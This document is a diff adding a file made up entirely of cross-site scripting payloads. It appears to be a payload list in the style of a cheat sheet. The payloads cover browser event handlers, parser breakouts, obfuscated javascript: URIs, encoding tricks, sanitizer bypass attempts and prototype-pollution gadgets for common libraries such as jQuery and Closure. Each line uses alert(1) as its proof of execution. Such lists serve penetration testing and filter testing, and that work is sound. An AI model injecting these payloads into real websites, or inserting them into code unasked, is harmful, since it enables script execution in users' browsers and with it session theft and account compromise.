@@ -1,0 +1,390 @@
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
+<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE
+<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio src/onerror=alert(1)>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<xss onfocus=alert(1) autofocus tabindex=1>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<body onload=alert(1)>
+<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
+<audio onloadstart="alert(1)"><source>
+<body onpagereveal=alert(1)>
+<body onpageshow=alert(1)>
+<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
+<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <xss class="scroll-item">Item 1</xss><xss class="scroll-item">Item 2</xss></xss>
+<xss onsecuritypolicyviolation=alert(1)>XSS</xss>
+x<template shadowrootmode=open><slot onslotchange=alert(1)>
+<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<details ontoggle=alert(1) open>test</details>
+<xss autofocus style=transition:1s ontransitionend=alert(1) tabindex=1>
+<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<camera onvalidationstatuschange=alert(1)>
+<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>
+<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></audio>
+<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>
+<xss style=transition:1s onwebkittransitionend=alert(1) tabindex=1 autofocus>
+<input onauxclick=alert(1)>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<xss contenteditable onbeforeinput=alert(1)>test
+<xss onbeforepaste=alert(1)>XSS</xss>
+<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
+<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>
+<input type=file oncancel=alert(1)>
+<input onchange=alert(1) value=xss>
+<xss onclick="alert(1)" style=display:block>test</xss>
+<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
+<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
+<xss oncontextmenu="alert(1)" style=display:block>test</xss>
+<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
+<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragexit="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss>
+<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>
+<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>
+<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>
+<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>
+<form onformdata="alert(1)"><button>Click</button></form>
+<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
+<div ongesturechange=alert(1)>XSS</div>
+<div ongestureend=alert(1)>XSS</div>
+<div ongesturestart=alert(1)>XSS</div>
+<input type=range ongotpointercapture=alert(1)>
+<input oninput=alert(1) value=xss>
+<form><input oninvalid=alert(1) required><input type=submit>
+<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>
+<xss onkeypress="alert(1)" contenteditable style=display:block>test</xss>
+<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>
+<geolocation autolocate onlocation=alert(1)>
+<input type=range onlostpointercapture=alert(1)>
+<xss onmousedown="alert(1)" style=display:block>test</xss>
+<xss onmouseenter="alert(1)" style=display:block>test</xss>
+<xss onmouseleave="alert(1)" style=display:block>test</xss>
+<xss onmousemove="alert(1)" style=display:block>test</xss>
+<xss onmouseout="alert(1)" style=display:block>test</xss>
+<xss onmouseover="alert(1)" style=display:block>test</xss>
+<xss onmouseup="alert(1)" style=display:block>test</xss>
+<xss onmousewheel=alert(1) style=display:block>requires scrolling
+<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
+<a onpaste="alert(1)" contenteditable>test</a>
+<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<xss onpointercancel=alert(1)>XSS</xss>
+<xss onpointerdown=alert(1) style=display:block>XSS</xss>
+<xss onpointerenter=alert(1) style=display:block>XSS</xss>
+<xss onpointerleave=alert(1) style=display:block>XSS</xss>
+<xss onpointermove=alert(1) style=display:block>XSS</xss>
+<xss onpointerout=alert(1) style=display:block>XSS</xss>
+<xss onpointerover=alert(1) style=display:block>XSS</xss>
+<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>
+<xss onpointerup=alert(1) style=display:block>XSS</xss>
+<geolocation onpromptaction=alert(1)>
+<geolocation onpromptdismiss=alert(1)>
+<audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<form onreset=alert(1)><input type=reset>
+<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
+<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<input onselect=alert(1) value="XSS" autofocus>
+<body onselectionchange=alert(1)>select some text
+<body onselectstart=alert(1)>select some text
+<usermedia onstream=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>
+<xss ontouchcancel=alert(1)>XSS</xss>
+<body ontouchend=alert(1)>
+<body ontouchmove=alert(1)>
+<body ontouchstart=alert(1)>
+<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls onwaiting=alert(1)><source src=x type=x></audio>
+<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>
+<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>
+<xss onwebkitmouseforcedown=alert(1)>XSS</xss>
+<xss onwebkitmouseforceup=alert(1)>XSS</xss>
+<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>
+<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>
+<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>
+<body onwheel=alert(1)>
+<math><textarea><img src onerror=alert(1)></textarea></math>
+<math><textarea><embed src=1 onerror=alert(1) type=image/gif></textarea></math>
+<math><textarea><body onload=alert(1)></textarea></math>
+<math><noscript><img src onerror=alert(1)></noscript></math>
+<math><noscript><embed src=1 onerror=alert(1) type=image/gif></noscript></math>
+<math><noscript><body onload=alert(1)></noscript></math>
+<math><title><img src onerror=alert(1)></title></math>
+<math><title><embed src=1 onerror=alert(1) type=image/gif></title></math>
+<math><title><body onload=alert(1)></title></math>
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
+<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
+<style><img title="</style><img src onerror=alert(1)>"></style>
+<script><img title="</script><img src onerror=alert(1)>"></script>
+<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
+<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
+<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
+<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
+<title><img title="</title><img src onerror=alert(1)>"></title>
+<select><noscript></select><img src onerror=alert(1)></noscript></select>
+<select><title></select><img src onerror=alert(1)></title></select>
+<select><style></select><img src onerror=alert(1)></style></select>
+<select><noembed></select><img src onerror=alert(1)></noembed></select>
+<select><xmp></select><img src onerror=alert(1)></xmp></select>
+<select><noframes></select><img src onerror=alert(1)></noframes></select>
+<script>undef01.undef02("INJECTION"+alert(1));function undef01(){}//");</script>
+<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>
+var inject = "INJECTION";import "data:text/jscript,alert(1)"//";</script>
+var inject = "INJECTION";function atob(){alert(1);}//";</script>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>throw onerror=eval,'alert\x281\x29'</script>
+<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>
+<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>
+<script>window.name='alert(1)';</script><script>location=name</script>
+<svg onload=alert(1)
+<svg onload=alert(1)<!--
+<script>var{a:onerror}={a:alert};throw 1</script>
+<script>var{haha:onerror=alert}=0;throw 1</script>
+<script>window.name='javascript:alert(1)';</script><svg onload=location=name>
+<script>window.name='javascript:alert(1)';function blah(){}
+<script>throw onerror=eval,name</script>
+<script>throw onerror=eval,'/*'+location</script>
+<svg onload="throw top.onerror=eval,'/*'+URL">
+<body onload="throw onerror=eval,'/*'+location">
+<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name="alert\x281\x29">';target.onload=setTimeout(function(){frames[0].postMessage("", "*")},100)</script>
+<script>throw onerror=eval,x=new Error,x.message='alert\x281\x29',x</script>
+<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\x281\x29',x</script>
+<script>window.name='alert(1)';</script><svg onload="attributes[0].value=name,new onload">
+<svg onload=innerHTML=URL,eval(textContent)>
+<svg onload=outerHTML=id id=<img/src/onerror=alert(1)&gt;
+javaScript:alert(1)
+javascript:alert(1)
+" srcdoc="<xss tabindex=1 autofocus onfocusin=alert(1)>"
+<xss tabindex=1 autofocus onfocus="throw self.onerror=&#97lert,1">
+<xss tabindex=1 autofocus onfocus="throw frames.onerror=&#97lert,1">
+<xss tabindex=1 autofocus onfocus="throw globalThis.onerror=&#97lert,1">
+<xss tabindex=1 autofocus onfocus="throw defaultView.onerror=&#97lert,1">
+<xss title=aler id=t tabindex=1 autofocus onfocus="throw defaultView.onerror=defaultView[title+id],1">
+<xss class=progress-bar-animated onanimationstart=alert(1)>
+<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
+<script src="data:text/javascript,alert(1)"></script>
+<svg><script href="data:text/javascript,alert(1)" />
+<script>import('data:text/javascript,alert(1)')</script>
+<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
+<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
+<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<script>eval('\x61lert(1)')</script>
+<script>eval('\141lert(1)')</script>
+<script>eval('alert(\061)')</script>
+<script>eval('alert(\61)')</script>
+<svg><script>x="&quot;,alert(1)//";</script></svg>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
+Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';
+Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';
+Object.prototype.div=['1','<img src onerror=alert(1)>','1']
+Object.prototype.url = ['data:,alert(1)//'];
+Object.prototype.src = ['data:,alert(1)//']
+Object.prototype.url = 'data:,alert(1)//'
+Object.prototype.srcdoc=['<script>alert(1)<\/script>']
+Object.prototype.hif = ['javascript:alert(document.domain)'];
+document.write(sanitizeHtml('<iframe onload=alert(1)>'))
+document.write(filterXSS('<img src onerror=alert(1)>'))
+document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))
+const html = '<img src onerror=alert(1)>';
+Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';
+Object.prototype.src='data:,alert(1)//'
+Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']
+<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
+<a href="#" onclick="jscript.compact:alert(1);">test</a>
+<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
+function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}
+function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; }
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>
+<!-- ><img title="--><iframe/onload=alert(1)>"> -->
+<svg><xss onload=alert(1)>
+<svg><discard onbegin=alert(1)>
+<img src=validimage.png onloadstart=alert(1)>
+<input type=image onloadend=alert(1) src=validimage.png>
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
+<marquee onstart=alert(1)>XSS</marquee>
+<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
+<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>
+<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
+<svg onload="throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}">#*/alert(1)//
+<body onload="throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}">#*/alert(1)//
+<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />
+<x onbeforescriptexecute=alert(1)><script>1</script>
+<x onafterscriptexecute=alert(1)><script>1</script>
+<script>navigation.navigate('javascript:alert(1)')</script>
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000  <b>XSS</b> "></video>
+<script> /*PREVIOUS STATIC JS*/ eval(myUndefVar); /*INJECTION PART WITH HOISTING*/ var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//"; </script>
+<script> /*PREVIOUS STATIC JS*/ myUndefFunction(13,37); /*INJECTION PART WITH HOISTING*/ var inject="INJECTION_STARTS_HERE";function myUndefFunction(){};alert(1);//"; </script>
+<script> /*PREVIOUS STATIC JS*/ var myUndefObject = new myUndefClass(); /*INJECTION PART WITH HOISTING*/ var inject="INJECTION_STARTS_HERE";function myUndefClass(){};alert(1);//"; </script>
+<script> /*PREVIOUS STATIC JS*/ $(document).ready(function(){ /*INJECTION PART WITH HOISTING*/ var inject="INJECTION_STARTS_HERE";});function $(){return{ready:()=>0}};alert(1);({//"; }); </script>
+<script type="module"> /*PREVIOUS STATIC JS*/ undef01.undef02.undef03.undef04.undef05(); /*INJECTION PART WITH HOISTING*/ var inject = "INJECTION";import "data:text/jscript,alert(1)"//";</script>
+<script> /*PREVIOUS STATIC JS*/ var x=atob("dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh"); undef01.undef02(); /*INJECTION PART WITH HOISTING*/ var inject = "INJECTION";function atob(){alert(1);}//";</script>
+<script>window.name='javascript:alert(1)';function blah(){} blah(""+{a:location=name}+"")</script>
+<script>window.name='javascript:alert(1)';function blah(){} blah(""+new class b{toString=e=>location=name}+"")</script>
+&NewLine;javascript:alert(1)
+&Tab;javascript:alert(1)
+%09javascript:alert(1)
+%20javascript:alert(1)
+&#1;javascript:alert(1)
+&#2;javascript:alert(1)
+&#3;javascript:alert(1)
+&#4;javascript:alert(1)
+&#5;javascript:alert(1)
+&#6;javascript:alert(1)
+&#7;javascript:alert(1)
+&#8;javascript:alert(1)
+&#9;javascript:alert(1)
+&#10;javascript:alert(1)
+&#11;javascript:alert(1)
+&#12;javascript:alert(1)
+&#13;javascript:alert(1)
+&#14;javascript:alert(1)
+&#15;javascript:alert(1)
+&#16;javascript:alert(1)
+&#17;javascript:alert(1)
+&#18;javascript:alert(1)
+&#19;javascript:alert(1)
+&#20;javascript:alert(1)
+&#21;javascript:alert(1)
+&#22;javascript:alert(1)
+&#23;javascript:alert(1)
+&#24;javascript:alert(1)
+&#25;javascript:alert(1)
+&#26;javascript:alert(1)
+&#27;javascript:alert(1)
+&#28;javascript:alert(1)
+&#29;javascript:alert(1)
+&#30;javascript:alert(1)
+&#31;javascript:alert(1)
+&#x1;javascript:alert(1)
+&#x2;javascript:alert(1)
+&#x3;javascript:alert(1)
+&#x4;javascript:alert(1)
+&#x5;javascript:alert(1)
+&#x6;javascript:alert(1)
+&#x7;javascript:alert(1)
+&#x8;javascript:alert(1)
+&#x9;javascript:alert(1)
+&#xa;javascript:alert(1)
+&#xb;javascript:alert(1)
+&#xc;javascript:alert(1)
+&#xd;javascript:alert(1)
+&#xe;javascript:alert(1)
+&#xf;javascript:alert(1)
+&#x10;javascript:alert(1)
+&#x11;javascript:alert(1)
+&#x12;javascript:alert(1)
+&#x13;javascript:alert(1)
+&#x14;javascript:alert(1)
+&#x15;javascript:alert(1)
+&#x16;javascript:alert(1)
+&#x17;javascript:alert(1)
+&#x18;javascript:alert(1)
+&#x19;javascript:alert(1)
+&#x1a;javascript:alert(1)
+&#x1b;javascript:alert(1)
+&#x1c;javascript:alert(1)
+&#x1d;javascript:alert(1)
+&#x1e;javascript:alert(1)
+&#x1f;javascript:alert(1)
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">XSS</a>
+<a href="JaVaScript:alert(1)">XSS</a>
+<a href=" 	javascript:alert(1)">XSS</a>
+<a href="javas	cript:alert(1)">XSS</a>
+<a href="javascript :alert(1)">XSS</a>
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>
+<math><x href="javascript:alert(1)">blah
+<form><button formaction=javascript:alert(1)>XSS
+<form><input type=submit formaction=javascript:alert(1) value=XSS>
+<form action=javascript:alert(1)><input type=submit value=XSS>
+<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>
+<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>
+<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+%C0%BCscript>alert(1)</script> %E0%80%BCscript>alert(1)</script> %F0%80%80%BCscript>alert(1)</script> %F8%80%80%80%BCscript>alert(1)</script> %FC%80%80%80%80%BCscript>alert(1)</script>
+<script>eval('\141lert(1)')</script> <script>eval('alert(\061)')</script> <script>eval('alert(\61)')</script>
+<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>
+<svg><script>&#97;lert(1)</script></svg> <svg><script>&#x61;lert(1)</script></svg> <svg><script>alert&NewLine;(1)</script></svg> <svg><script>x="&quot;,alert(1)//";</script></svg>
+<a href="&#0000106avascript:alert(1)">XSS</a>
+<a href="&#x6a;avascript:alert(1)">XSS</a>
+<a href="j&#x61vascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a>
+<a href="&#x0000006a;avascript:alert(1)">XSS</a>
+<a href="&#X6A;avascript:alert(1)">XSS</a>
+<a href="javascript&colon;alert(1)">XSS</a> <a href="java&Tab;script:alert(1)">XSS</a> <a href="java&NewLine;script:alert(1)">XSS</a> <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"  onmouseover=/*&lt;svg/*/onload=alert()//>
+<!-- Start Framework code--><script src="https://fast.wistia.com/embed/medias/j38ihh83m5.jsonp" async></script><script src="https://fast.wistia.com/assets/external/E-v1.js" async></script><div class="wistia_embed wistia_async_j38ihh83m5"></div> <!--End Framework code--> <script> Object.prototype.innerHTML = '<img/src/onerror=alert(1)>'; </script>
+<!-- Start Framework code--><script/src=https://code.jquery.com/jquery-3.3.1.js></script> <!--End Framework code--> <script> Object.prototype.preventDefault='x'; Object.prototype.handleObj='x'; Object.prototype.delegateTarget='<img/src/onerror=alert(1)>'; /* No extra code needed for jQuery 1 & 2 */$(document).off('foobar'); </script>
+<!-- Start Framework code--><script/src=https://code.jquery.com/jquery-3.3.1.js></script> <!--End Framework code--> <script> Object.prototype.div=['1','<img src onerror=alert(1)>','1'] </script><script> $('<div x="x"></div>') </script>
+<!-- Start Framework code--><script src=https://code.jquery.com/jquery-3.5.1.js></script> <!--End Framework code--> <script> Object.prototype.url = ['data:,alert(1)//']; Object.prototype.dataType = 'script'; </script> <script> $.get('https://google.com/'); $.post('https://google.com/'); </script>
+<!-- Start Framework code--><script src=https://code.jquery.com/jquery-3.5.1.js></script> <!--End Framework code--> <script> Object.prototype.src = ['data:,alert(1)//'] </script> <script> $.getScript('https://google.com/') </script>
+<!-- Start Framework code--><script/src=https://code.jquery.com/jquery-3.3.1.js></script> <!--End Framework code--> <script> Object.prototype.url = 'data:,alert(1)//' </script> <script> $.getScript('https://google.com/') </script>
+<!-- Start Framework code--><script src="https://www.google.com/recaptcha/api.js" async defer></script> <!--End Framework code--> <script> Object.prototype.srcdoc=['<script>alert(1)<\/script>'] </script> <div class="g-recaptcha" data-sitekey="your-site-key"/>
+<script> Object.prototype.hif = ['javascript:alert(document.domain)']; </script> <!-- Start Framework code--><script> !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments); },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script'); twq('init','twitter_pixel_id');twq('track', 'PageView'); </script> <!--End Framework code-->
+<!-- Start Framework code--><script> Object.prototype['* ONERROR'] = 1; Object.prototype['* SRC'] = 1; </script> <script src=https://google.github.io/closure-library/source/closure/goog/base.js></script> <script> goog.require('goog.html.sanitizer.HtmlSanitizer'); goog.require('goog.dom'); </script> <!--End Framework code--> <script> const html = '<img src onerror=alert(1)>'; const sanitizer = new goog.html.sanitizer.HtmlSanitizer(); const sanitized = sanitizer.sanitize(html); const node = goog.dom.safeHtmlToNode(sanitized); document.body.append(node); </script>
+<script> Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//'; </script> <!-- Start Framework code--><script src=https://google.github.io/closure-library/source/closure/goog/base.js></script> <script> goog.require('goog.html.sanitizer.HtmlSanitizer'); goog.require('goog.dom'); </script> <!--End Framework code-->
+<script> Object.prototype.src='data:,alert(1)//' </script> <!-- Start Framework code--><script src="https://assets.adobedtm.com/launch-ENa21cfed3f06f4ddf9690de8077b39e81-development.min.js" async></script> <!--End Framework code-->
+<script> Object.prototype.onload = 'alert(1)' </script> <!-- Start Framework code--><blockquote class="reddit-card" data-card-created="1603396221"> <a href="https://www.reddit.com/r/Slackers/comments/c5bfmb/xss_challenge/">XSS Challenge</a> </blockquote> <script async src="https://embed.redditmedia.com/widgets/platform.js" charset="UTF-8"></script> <!--End Framework code-->
+<!-- Start Framework code--><script src=https://code.jquery.com/jquery-3.3.1.js></script> <!--End Framework code--> <script> Object.prototype.on = 'click'; $('body').on('click', function() { alert('Injected Event'); }); $('body').trigger('click'); </script>
+<img src="javascript:alert(1)">
+<body background="javascript:alert(1)">
+<a href="#" onclick="jscript.compact:alert(1);">test</a> <a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
+<a title="&{alert(1)}">XSS</a>
+<div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio\006e(alert(1))> <div style=xss:expressio\00006e(alert(1))> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio&#x5c;6e(alert(1))>
+<div style=xss=expression(alert(1))> <div style="color&#x3dred">test</div>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
+<script> function window.onload(){ alert(1); } </script> <script> function window::onload(){ alert(1); } </script> <script> function window.location(){ } </script> <body> <script> function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){} </script> </body> <body> <script> function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; } </script> </body>
+<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>
+<a href="javascript&colon;alert(1)">Firefox</a>
+<!-- ><img title="--><iframe/onload=alert(1)>"> --> <!-- ><img title="--><iframe/onload=alert(1)>"> -->
+<isindex type=submit formaction=javascript:alert(1)>
+<isindex type=submit action=javascript:alert(1)>
+<script>location.protocol='javascript';</script># alert(1)//
+<a href="javascript://%0aalert(1)">XSS</a>
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<object data=# codebase=javascript:alert(document.domain)//>
+<embed src=# codebase=javascript:alert(document.domain)//>
+<object data="# alert(1)" codebase=javascript://>
+<object data="#! alert(1)" codebase=javascript:>
+<embed src="# alert(1)" codebase=javascript://>
+<embed src="#! alert(1)" codebase=javascript:>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
